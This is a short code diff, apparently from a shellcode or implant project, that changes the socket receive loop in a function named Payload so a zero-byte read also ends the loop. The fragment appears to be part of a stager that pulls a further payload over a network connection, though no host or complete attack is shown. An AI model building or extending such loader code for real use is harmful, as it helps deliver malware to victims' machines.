@@ -921,7 +921,7 @@ void Payload(SHELLCODE_CONTEXT *scc){
             while ((dwASize > 0) && (bReceived==true)){
                 lResult = scc->recv_(scc->hSocket, (char*)(bBuff+(dwSize-dwASize)), dwASize, 0);
                 dwASize -= lResult;
-                if(lResult < 0)
+                if(lResult <= 0)
                     bReceived = false;
             }
             dwDSize = dwSize;
